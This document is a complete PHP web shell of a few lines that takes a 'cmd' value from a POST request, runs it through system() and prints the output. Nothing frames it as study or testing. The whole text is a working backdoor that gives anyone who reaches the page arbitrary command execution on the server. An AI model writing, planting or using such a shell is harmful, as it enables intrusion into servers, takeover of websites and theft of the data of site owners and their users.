<?
if(isset($_POST['cmd'])){
$var = system($_POST['cmd']);
echo $var;
}

?>